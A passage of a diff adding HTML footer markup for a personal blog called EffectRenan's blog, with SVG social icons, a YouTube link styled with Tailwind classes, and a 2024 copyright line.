+  <path d="M24.7612 55.999V28.3354H15.5433V55.999H24.7621H24.7612ZM20.1542 24.5591C23.3679 24.5591 25.3687 22.4348 25.3687 19.7801C25.3086 17.065 23.3679 15 20.2153 15C17.0605 15 15 17.065 15 19.7799C15 22.4346 17.0001 24.5588 20.0938 24.5588H20.1534L20.1542 24.5591ZM29.8633 55.999H39.0805V40.5521C39.0805 39.7264 39.1406 38.8985 39.3841 38.3088C40.0502 36.6562 41.5668 34.9455 44.1138 34.9455C47.4484 34.9455 48.7831 37.4821 48.7831 41.2014V55.999H58V40.1376C58 31.6408 53.4532 27.6869 47.3887 27.6869C42.4167 27.6869 40.233 30.4589 39.0198 32.347H39.0812V28.3364H29.8638C29.9841 30.9316 29.8631 56 29.8631 56L29.8633 55.999Z" fill="#111827"></path>
+  </svg></a>
+
+  <a href="https://youtube.com/EffectRenan" class="
+  p-2 
+  rounded-lg 
+  flex 
+  items-center 
+  justify-center 
+  transition-all 
+  bg-yellow-300
+
+  border 
+  border-y-4
+  border-black
+
+  hover:border-x-4
+  hover:border-y-0
+  hover:bg-yellow-500
+  duration-100
+" target="_blank" rel="noopener noreferrer">
+    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 71 71" fill="none">
+    <path fill-rule="evenodd" clip-rule="evenodd" d="M56.5615 18.2428C58.8115 18.8504 60.58 20.6234 61.1778 22.8708C62.2654 26.9495 62.2654 35.4647 62.2654 35.4647C62.2654 35.4647 62.2654 43.98 61.1778 48.0586C60.5717 50.3144 58.8032 52.0873 56.5615 52.6866C52.4932 53.7771 36.1703 53.7771 36.1703 53.7771C36.1703 53.7771 19.8557 53.7771 15.7791 52.6866C13.5291 52.079 11.7606 50.306 11.1628 48.0586C10.0752 43.98 10.0752 35.4647 10.0752 35.4647C10.0752 35.4647 10.0752 26.9495 11.1628 22.8708C11.7689 20.615 13.5374 18.8421 15.7791 18.2428C19.8557 17.1523 36.1703 17.1523 36.1703 17.1523C36.1703 17.1523 52.4932 17.1523 56.5615 18.2428ZM44.5142 35.4647L30.9561 43.314V27.6154L44.5142 35.4647Z" fill="#111827"></path>
+    </svg>
+  </a>
+<div>
+</div></div>
+  <span class="
+    py-2
+    flex 
+    items-center 
+    justify-center 
+    gap-2 
+    flex-wrap 
+    text-sm 
+    sm:text-center 
+    text-white 
+    hover:underline 
+    hover:decoration-wavy 
+    hover:decoration-yellow-500
+    ">
+    <a href="https://blog.effectrenan.com" class="hover:underline">© 2024 EffectRenan's blog. All Rights Reserved.</a>
+  </span>
+</div>
+  </body></html>
